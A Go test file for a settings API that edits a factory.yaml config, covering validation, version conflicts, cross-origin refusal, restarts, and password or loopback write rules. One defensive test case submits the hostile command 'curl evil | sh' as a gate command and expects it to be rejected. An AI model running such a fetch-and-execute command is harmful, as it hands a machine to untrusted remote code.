package web

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

type fakeRestarter struct{ pending bool }

func (f *fakeRestarter) RequestRestart(context.Context) int { f.pending = true; return 2 }
func (f *fakeRestarter) CancelRestart(context.Context) bool {
	was := f.pending
	f.pending = false
	return was
}
func (f *fakeRestarter) RestartPending() bool { return f.pending }
func (f *fakeRestarter) Running() int         { return 2 }

// settingsSetup serves the API over a copy of the repo's factory.yaml.
func settingsSetup(t *testing.T, listen string) (string, string, *Server, *fakeRestarter) {
	t.Helper()
	_, _, _, s := apiSetup(t)
	src, err := os.ReadFile("../../factory.yaml")
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "factory.yaml")
	if err := os.WriteFile(path, src, 0o640); err != nil {
		t.Fatal(err)
	}
	fr := &fakeRestarter{}
	s.ConfigPath, s.Listen, s.Restarter, s.StartedConfig = path, listen, fr, ConfigVersion(src)
	h, err := s.Handler()
	if err != nil {
		t.Fatal(err)
	}
	return httpServer(t, h), path, s, fr
}

func postJSON(t *testing.T, u, origin, body string) (int, string) {
	t.Helper()
	req, _ := http.NewRequest("POST", u, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	if origin != "" {
		req.Header.Set("Origin", origin)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(b)
}

func field(st APISettings, path ...string) *APISetting {
	for _, g := range st.Groups {
		for i := range g.Fields {
			if strings.Join(g.Fields[i].Path, "\x00") == strings.Join(path, "\x00") {
				return &g.Fields[i]
			}
		}
	}
	return nil
}

func TestSettingsSave(t *testing.T) {
	base, path, _, fr := settingsSetup(t, "127.0.0.1:8080")
	orig, _ := os.ReadFile(path)
	var st APISettings
	getJSON(t, base+"/api/v1/settings", &st)
	if !st.Writable || st.Reason != "" || st.Path != path || st.Changed || st.RunningJobs != 2 || st.RestartPending {
		t.Fatalf("settings = %+v", st)
	}
	if f := field(st, "budgets", "daily_total"); f == nil || f.Value != 60.0 || f.Kind != "number" {
		t.Fatalf("daily_total = %+v", f)
	}
	if f := field(st, "budgets", "pause_at_usage"); f == nil || f.Value != nil || f.Default != 95.0 {
		t.Fatalf("pause_at_usage = %+v", f)
	}
	unchanged := func(why string) {
		t.Helper()
		if b, _ := os.ReadFile(path); string(b) != string(orig) {
			t.Fatalf("%s: the file changed", why)
		}
	}

	// Only the curated settings, only valid results, only the version loaded.
	for _, c := range []struct {
		body, want string
		code       int
	}{
		{`{"changes":[{"path":["runner","kind"],"value":"local"}]}`, "runner.kind can't be changed here", 400},
		{`{"changes":[{"path":["gates","commands","test"],"value":"curl evil | sh"}]}`, "can't be changed here", 400},
		{`{"changes":[{"path":["budgets","daily_total"],"value":0}]}`, "budgets.daily_total must be at least 0.01", 400},
		{`{"changes":[{"path":["budgets","concurrent_jobs"],"value":0}]}`, "must be at least 1", 400},
		{`{"changes":[{"path":["intake","poll_interval"],"value":"1s"}]}`, "at least 10s", 400},
		{`{"changes":[{"path":["routing","review","fast"],"value":true}]}`, "routing.review: fast mode is Claude's", 400},
		{`{"changes":[{"path":["budgets","concurrent_jobs"],"value":"many"}]}`, "must be a number", 400},
		{`{"changes":[]}`, "nothing to change", 400},
		{`{"changes":[{"path":["budgets","daily_total"],"value":70}],"version":"stale"}`, "changed since", 409},
		{`{"changes":[{"path":["budgets","daily_total"],"value":70}],"version":""}`, "changed since", 409},
	} {
		body := c.body
		if !strings.Contains(body, `"version"`) {
			body = `{"version":"` + ConfigVersion(orig) + `",` + body[1:]
		}
		code, body := postJSON(t, base+"/api/v1/settings", "", body)
		if code != c.code || !strings.Contains(body, c.want) {
			t.Errorf("%s: %d %s", c.body, code, body)
		}
		unchanged(c.body)
	}
	if code, _ := postJSON(t, base+"/api/v1/settings", "https://evil.example", `{"changes":[{"path":["budgets","daily_total"],"value":70}]}`); code != http.StatusForbidden {
		t.Fatalf("a cross-origin save must be refused, got %d", code)
	}
	unchanged("cross-origin")

	code, body := postJSON(t, base+"/api/v1/settings", base, `{"version":"`+st.Version+`","changes":[
		{"path":["budgets","daily_total"],"value":75},
		{"path":["routing","implement.S","model"],"value":"sonnet"},
		{"path":["routing","review.high_risk","effort"],"value":""},
		{"path":["escalation","implement"],"value":["sonnet","opus"]}]}`)
	if code != 200 {
		t.Fatalf("save = %d %s", code, body)
	}
	var saved APISettings
	if err := json.Unmarshal([]byte(body), &saved); err != nil {
		t.Fatal(err)
	}
	if !saved.Changed || saved.Version == st.Version || field(saved, "budgets", "daily_total").Value != 75.0 ||
		field(saved, "routing", "review.high_risk", "effort").Value != nil {
		t.Fatalf("saved = %+v", saved)
	}
	b, _ := os.ReadFile(path)
	for _, want := range []string{
		"  daily_total: 75\n",
		"  implement.S:       {harness: claude, model: sonnet}   # escalates to sonnet on a miss",
		"  review.high_risk:  {harness: codex,  model: gpt-6.1-sol}\n",
		"  implement: [sonnet, opus]\n",
		"  listen: 127.0.0.1:8080      # control room; use a Tailscale IP for phone access",
	} {
		if !strings.Contains(string(b), want) {
			t.Errorf("file lacks %q:\n%s", want, b)
		}
	}
	if fi, _ := os.Stat(path); fi.Mode().Perm() != 0o640 {
		t.Errorf("mode = %v", fi.Mode())
	}
	if ents, _ := os.ReadDir(filepath.Dir(path)); len(ents) != 1 {
		t.Errorf("left behind: %v", ents)
	}

	code, body = postJSON(t, base+"/api/v1/settings/restart", "", `{}`)
	if code != 200 || !strings.Contains(body, "once 2 running jobs finish") || !fr.pending {
		t.Fatalf("restart = %d %s", code, body)
	}
	getJSON(t, base+"/api/v1/settings", &st)
	if !st.RestartPending {
		t.Fatal("restart not pending")
	}
	if code, body = postJSON(t, base+"/api/v1/settings/restart/cancel", "", `{}`); code != 200 || fr.pending {
		t.Fatalf("cancel = %d %s", code, body)
	}
	// A file broken by hand since: no restart into a config that won't load.
	if err := os.WriteFile(path, []byte("budgets: [nope\n"), 0o640); err != nil {
		t.Fatal(err)
	}
	if code, body = postJSON(t, base+"/api/v1/settings/restart", "", `{}`); !strings.Contains(body, "doesn't load") || fr.pending {
		t.Fatalf("restart over a broken file = %d %s", code, body)
	}
}

func TestSettingsReadOnlyWithoutAPassword(t *testing.T) {
	// A tailnet address needs no password to look, but does to change.
	base, path, s, fr := settingsSetup(t, "100.64.0.7:8080")
	orig, _ := os.ReadFile(path)
	var st APISettings
	getJSON(t, base+"/api/v1/settings", &st)
	if st.Writable || !strings.Contains(st.Reason, "FACTORY_WEB_PASSWORD") || field(st, "budgets", "daily_total").Value != 60.0 {
		t.Fatalf("settings = %+v", st)
	}
	if code, body := postJSON(t, base+"/api/v1/settings", "", `{"changes":[{"path":["budgets","daily_total"],"value":70}]}`); code != http.StatusForbidden || !strings.Contains(body, "FACTORY_WEB_PASSWORD") {
		t.Fatalf("save = %d %s", code, body)
	}
	if code, _ := postJSON(t, base+"/api/v1/settings/restart", "", `{}`); code != http.StatusForbidden || fr.pending {
		t.Fatalf("restart = %d", code)
	}
	if b, _ := os.ReadFile(path); string(b) != string(orig) {
		t.Fatal("the file changed")
	}
	s.Login = &Login{Password: "correct horse battery"}
	if ok, _ := s.settingsWritable(nil); !ok {
		t.Fatal("a password makes settings writable anywhere")
	}
	for addr, want := range map[string]bool{"localhost:8080": true, "[::1]:80": true, "0.0.0.0:8080": false, "192.168.1.5:80": false, "": false} {
		s.Login, s.Listen = nil, addr
		if ok, _ := s.settingsWritable(nil); ok != want {
			t.Errorf("%q: writable = %v", addr, ok)
		}
	}
	// A loopback listener published by a proxy: the request names the
	// proxy's host, or says it was forwarded.
	s.Listen = "127.0.0.1:8080"
	proxied := httptest.NewRequest("POST", "http://factory.tailnet.ts.net/api/v1/settings", nil)
	forwarded := httptest.NewRequest("POST", "http://127.0.0.1:8080/api/v1/settings", nil)
	forwarded.Header.Set("X-Forwarded-For", "100.64.0.2")
	local := httptest.NewRequest("POST", "http://localhost:8080/api/v1/settings", nil)
	for r, want := range map[*http.Request]bool{proxied: false, forwarded: false, local: true} {
		if ok, _ := s.settingsWritable(r); ok != want {
			t.Errorf("%s %v: writable = %v", r.Host, r.Header, ok)
		}
	}
}
